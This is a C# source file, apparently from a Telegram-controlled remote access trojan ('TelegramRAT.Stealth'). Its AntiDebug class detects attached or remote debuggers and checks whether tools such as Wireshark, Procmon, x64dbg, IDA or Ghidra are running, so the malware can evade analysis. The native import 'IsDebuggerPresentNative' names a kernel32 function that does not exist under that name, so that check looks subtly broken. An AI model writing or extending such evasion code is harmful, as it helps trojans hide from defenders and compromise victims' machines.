namespace TelegramRAT.Stealth;

using System.Diagnostics;
using System.Runtime.InteropServices;

internal static class AntiDebug
{
    public static bool IsDebuggerPresent()
    {
        if (Debugger.IsAttached)
            return true;

        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            if (IsDebuggerPresentNative())
                return true;

            if (CheckRemoteDebugger())
                return true;
        }

        if (IsRunningInSandbox())
            return true;

        return false;
    }

    private static bool CheckRemoteDebugger()
    {
        var result = CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, out var isDebuggerPresent);
        return result && isDebuggerPresent;
    }

    private static bool IsRunningInSandbox()
    {
        var suspiciousProcesses = new[]
        {
            "wireshark", "fiddler", "processhacker", "procmon",
            "x64dbg", "x32dbg", "ollydbg", "ida", "ghidra"
        };

        var runningProcesses = Process.GetProcesses()
            .Select(p => p.ProcessName.ToLowerInvariant())
            .ToHashSet();

        return suspiciousProcesses.Any(runningProcesses.Contains);
    }

    [DllImport("kernel32.dll")]
    private static extern bool IsDebuggerPresentNative();

    [DllImport("kernel32.dll", SetLastError = true, EntryPoint = "CheckRemoteDebuggerPresent")]
    private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool isDebuggerPresent);
}
